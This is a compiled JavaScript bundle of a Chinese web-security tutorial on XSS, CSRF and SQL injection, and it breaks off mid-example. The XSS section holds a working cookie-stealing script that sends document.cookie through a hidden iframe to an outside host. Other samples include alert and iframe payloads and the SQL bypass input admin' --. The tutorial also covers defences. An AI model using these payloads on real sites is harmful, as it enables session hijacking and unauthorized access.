(window.webpackJsonp=window.webpackJsonp||[]).push([[37],{587:function(s,t,a){s.exports=a.p+"assets/img/1557991518526.3051bd2f.png"},588:function(s,t,a){s.exports=a.p+"assets/img/1557992407088.fd6da519.png"},589:function(s,t,a){s.exports=a.p+"assets/img/1557992492153.5ffc86c3.png"},590:function(s,t,a){s.exports=a.p+"assets/img/1558012539913.8acbef95.png"},813:function(s,t,a){"use strict";a.r(t);var e=a(0),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("p",[s._v("常见的对称加密算法有"),e("a",{attrs:{href:"https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96",target:"_blank",rel:"noopener noreferrer"}},[s._v("DES"),e("OutboundLink")],1),s._v("、"),e("a",{attrs:{href:"https://zh.wikipedia.org/wiki/3DES",target:"_blank",rel:"noopener noreferrer"}},[s._v("3DES"),e("OutboundLink")],1),s._v("、"),e("a",{attrs:{href:"https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86",target:"_blank",rel:"noopener noreferrer"}},[s._v("AES"),e("OutboundLink")],1),s._v("、"),e("a",{attrs:{href:"https://zh.wikipedia.org/wiki/Blowfish_(%E5%AF%86%E7%A0%81%E5%AD%A6)",target:"_blank",rel:"noopener noreferrer"}},[s._v("Blowfish"),e("OutboundLink")],1),s._v("、"),e("a",{attrs:{href:"https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95",target:"_blank",rel:"noopener noreferrer"}},[s._v("IDEA"),e("OutboundLink")],1),s._v("、"),e("a",{attrs:{href:"https://zh.wikipedia.org/wiki/RC5",target:"_blank",rel:"noopener noreferrer"}},[s._v("RC5"),e("OutboundLink")],1),s._v("、"),e("a",{attrs:{href:"https://zh.wikipedia.org/wiki/RC6",target:"_blank",rel:"noopener noreferrer"}},[s._v("RC6"),e("OutboundLink")],1),s._v("。")]),s._v(" "),e("h2",{attrs:{id:"一、xss攻击"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#一、xss攻击"}},[s._v("#")]),s._v(" 一、XSS攻击")]),s._v(" "),e("p",[e("a",{attrs:{href:"https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2F%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%2F8186208",target:"_blank",rel:"noopener noreferrer"}},[s._v("跨站脚本攻击"),e("OutboundLink")],1),s._v("(Cross Site Scripting)，为了不和"),e("a",{attrs:{href:"https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2F%E5%B1%82%E5%8F%A0%E6%A0%B7%E5%BC%8F%E8%A1%A8",target:"_blank",rel:"noopener noreferrer"}},[s._v("层叠样式表"),e("OutboundLink")],1),s._v("(Cascading Style Sheets, "),e("a",{attrs:{href:"https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FCSS%2F5457",target:"_blank",rel:"noopener noreferrer"}},[s._v("CSS"),e("OutboundLink")],1),s._v(")的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意的Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。")]),s._v(" "),e("p",[e("img",{attrs:{src:a(587),alt:"1557991518526"}})]),s._v(" "),e("p",[e("strong",[s._v("特点：尽一切办法在目标网站上执行非目标网站上原有的脚本。")])]),s._v(" "),e("h3",{attrs:{id:"xss危害"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#xss危害"}},[s._v("#")]),s._v(" XSS危害")]),s._v(" "),e("ol",[e("li",[s._v("使用js或css破坏页面正常的结构与样式")]),s._v(" "),e("li",[s._v("通过document.cookie盗取cookie，实现无密码访问")]),s._v(" "),e("li",[s._v("流量劫持（通过访问某段具有window.location.href定位到其他页面）")]),s._v(" "),e("li",[s._v("Dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。")]),s._v(" "),e("li",[s._v("利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。")]),s._v(" "),e("li",[s._v("利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。")])]),s._v(" "),e("h3",{attrs:{id:"攻击方式"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#攻击方式"}},[s._v("#")]),s._v(" 攻击方式")]),s._v(" "),e("h4",{attrs:{id:"_1-reflected-xss（基于反射的xss攻击）"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_1-reflected-xss（基于反射的xss攻击）"}},[s._v("#")]),s._v(" "),e("strong",[s._v("1. Reflected XSS（基于反射的XSS攻击）")])]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),e("p",[s._v("非持久型，反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。")])]),s._v(" "),e("p",[s._v("反射型 XSS 的攻击步骤：")]),s._v(" "),e("ul",[e("li",[s._v("攻击者构造出特殊的 URL，其中包含恶意代码。")]),s._v(" "),e("li",[s._v("用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。")]),s._v(" "),e("li",[s._v("用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。")]),s._v(" "),e("li",[s._v("恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。")])]),s._v(" "),e("p",[e("img",{attrs:{src:a(588),alt:"1557992407088"}})]),s._v(" "),e("h4",{attrs:{id:"_2-stored-xss（基于存储的xss攻击）"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_2-stored-xss（基于存储的xss攻击）"}},[s._v("#")]),s._v(" "),e("strong",[s._v("2. Stored XSS（基于存储的XSS攻击）")])]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("持久型：")]),s._v(" "),e("p",[s._v("这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。")])]),s._v(" "),e("p",[s._v("存储型 XSS 的攻击步骤：")]),s._v(" "),e("ul",[e("li",[s._v("攻击者将恶意代码提交到目标网站的数据库中。")]),s._v(" "),e("li",[s._v("用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。")]),s._v(" "),e("li",[s._v("用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。")]),s._v(" "),e("li",[s._v("恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。")])]),s._v(" "),e("p",[e("img",{attrs:{src:a(589),alt:"1557992492153"}})]),s._v(" "),e("h4",{attrs:{id:"_3-dom-based-or-local-xss（基于dom或本地的xss攻击）"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-dom-based-or-local-xss（基于dom或本地的xss攻击）"}},[s._v("#")]),s._v(" "),e("strong",[s._v("3. DOM-based or local XSS（基于DOM或本地的XSS攻击）")])]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),e("p",[s._v("一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。")])]),s._v(" "),e("p",[s._v("DOM 型 XSS 的攻击步骤：")]),s._v(" "),e("ul",[e("li",[s._v("攻击者构造出特殊的 URL，其中包含恶意代码。")]),s._v(" "),e("li",[s._v("用户打开带有恶意代码的 URL。")]),s._v(" "),e("li",[s._v("用户浏览器接收到响应后解析执行，前端  JavaScript 取出 URL 中的恶意代码并执行。")]),s._v(" "),e("li",[s._v("恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。")])]),s._v(" "),e("p",[s._v("简单案例")]),s._v(" "),e("p",[s._v("使用xss弹出恶意警告框，代码为：")]),s._v(" "),e("div",{staticClass:"language-js line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-js"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"xss"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("xss输入也可能是html代码段，如果使网页不停的刷新，代码为：")]),s._v(" "),e("div",{staticClass:"language-html line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("meta")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("http-equiv")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("refresh"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),s._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("content")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("0;"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("嵌入其他网站链接的代码为：")]),s._v(" "),e("div",{staticClass:"language-html line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("iframe")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("src")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("http://www.jsay.org"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),s._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("width")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("=")]),s._v("0")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("height")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("=")]),s._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("</")]),s._v("iframe")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("\x3c!-- jsay.org 个人小站还没开始运行哦！ --\x3e")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[e("code",[s._v("JavaScript")]),s._v(" 写一个请求跨站的脚本就是XSS了，如下：")]),s._v(" "),e("div",{staticClass:"language-javascript line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v(" jsay"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("org 个人小站还没开始运行哦！ "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v(" 将此段代码放在评论"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("留言框中提交 "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script type"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"text/javascript"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token parameter"}},[s._v("window"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" document")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n      "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 构造泄露信息用的 URL")]),s._v("\n      "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" cookies "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" xssURIBase "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://www.jsay.org/xss/"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" xssURI "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" xssURIBase "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" window"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("encodeURI")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cookies"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 建立隐藏 iframe 用于通讯")]),s._v("\n      "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" hideFrame "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("createElement")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"iframe"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      hideFrame"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("height "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      hideFrame"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("width "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      hideFrame"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("style"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("display "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"none"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      hideFrame"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("src "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" xssURI"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n      "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 开工")]),s._v("\n      document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("body"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("appendChild")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("hideFrame"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("window"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br")])]),e("h3",{attrs:{id:"xss防御"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#xss防御"}},[s._v("#")]),s._v(" XSS防御")]),s._v(" "),e("p",[e("strong",[s._v("思路：对输入(和URL参数)进行过滤，对输出进行编码。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击。")])]),s._v(" "),e("ol",[e("li",[s._v("对输入、URL参数等（如："),e("code",[s._v("<>")]),s._v("、"),e("code",[s._v("/")]),s._v(" 、"),e("code",[s._v("&")]),s._v("、"),e("code",[s._v("'")]),s._v("、"),e("code",[s._v('"')]),s._v(" ）进行转义、"),e("strong",[s._v("过滤")]),s._v("，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据；")]),s._v(" "),e("li",[s._v("输出数据之前对潜在的威胁的字符进行"),e("strong",[s._v("编码")]),s._v("、转义；")]),s._v(" "),e("li",[s._v("转义HTML(效果不怎样)")]),s._v(" "),e("li",[s._v("XSS 一般利用js脚步读取用户浏览器中的Cookie，而如果在服务器端对 Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie。")]),s._v(" "),e("li",[s._v("设置黑、白名单；")]),s._v(" "),e("li",[e("a",{attrs:{href:"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2016%2F09%2Fcsp.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("Content Security Policy"),e("OutboundLink")],1),s._v(" 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。")]),s._v(" "),e("li",[s._v("验证码")])]),s._v(" "),e("h2",{attrs:{id:"二、csrf攻击"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#二、csrf攻击"}},[s._v("#")]),s._v(" 二、CSRF攻击")]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("CSRF（Cross-site request forgery）跨站请求伪造：")]),s._v(" "),e("p",[s._v("也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（"),e("a",{attrs:{href:"https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FXSS",target:"_blank",rel:"noopener noreferrer"}},[s._v("XSS"),e("OutboundLink")],1),s._v("），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。与"),e("a",{attrs:{href:"https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FXSS",target:"_blank",rel:"noopener noreferrer"}},[s._v("XSS"),e("OutboundLink")],1),s._v("攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比"),e("a",{attrs:{href:"https://link.juejin.im?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FXSS",target:"_blank",rel:"noopener noreferrer"}},[s._v("XSS"),e("OutboundLink")],1),s._v("更具危险性。")])]),s._v(" "),e("p",[e("strong",[s._v("本质原因：CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决。")])]),s._v(" "),e("p",[s._v("CSRF攻击条件：")]),s._v(" "),e("ul",[e("li",[e("p",[s._v("登录受信任网站A，并在本地生成Cookie。")])]),s._v(" "),e("li",[e("p",[s._v("在不登出A的情况下，访问危险网站B。")]),s._v(" "),e("p",[e("img",{attrs:{src:a(590),alt:"1558012539913"}})])])]),s._v(" "),e("p",[s._v("虽然有些时候你访问B网站的时候，并没有访问A网站，但是你并不能保证之前登录过A网站的本地Cookie已过期，这个时候B网站一样是可以发起攻击。 CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！")]),s._v(" "),e("h3",{attrs:{id:"csrf的防御"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#csrf的防御"}},[s._v("#")]),s._v(" CSRF的防御")]),s._v(" "),e("ol",[e("li",[s._v("Cookie Hashing(所有表单都包含同一个伪随机值);")]),s._v(" "),e("li",[s._v("验证码;")]),s._v(" "),e("li",[s._v("One-Time Tokens(不同的表单包含一个不同的伪随机值);")]),s._v(" "),e("li",[e("strong",[s._v("Referer 验证")]),s._v(":Referer 指的是页面请求来源。意思是，"),e("strong",[s._v("只接受本站的请求，服务器才做响应")]),s._v("；如果不是，就拦截。")]),s._v(" "),e("li",[e("strong",[s._v("尽量使用POST，限制GET")])])]),s._v(" "),e("h2",{attrs:{id:"三、sql注入"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#三、sql注入"}},[s._v("#")]),s._v(" 三、SQL注入")]),s._v(" "),e("div",{staticClass:"custom-block tip"},[e("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),e("p",[s._v("通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。")])]),s._v(" "),e("h3",{attrs:{id:"原理"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[s._v("#")]),s._v(" 原理")]),s._v(" "),e("p",[s._v("SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。")]),s._v(" "),e("p",[e("strong",[s._v("简单举例：")])]),s._v(" "),e("div",{staticClass:"language-javascript line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 前端给后端post键值对，登录的用户名和密码")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("let")]),s._v(" data "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  username"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'admin'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n  pwd"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'abc123456'")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 后端的sql语句")]),s._v("\n "),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("SELECT")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("FROM")]),s._v(" user "),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("WHERE")]),s._v(" username"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'${username}'")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("AND")]),s._v(" psw"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'${pwd}'")]),s._v("\n复制代码\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("p",[s._v("这个时候前端的 "),e("code",[s._v("username")]),s._v(" 别人输入 "),e("code",[s._v("admin' --")]),s._v(" ；这个时候查询的 "),e("code",[s._v("SQL")]),s._v(" 语句就变成这样子了：")]),s._v(" "),e("div",{staticClass:"language-sql line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sql"}},[e("code",[e("span",{pre:!0,attrs:{class:"token 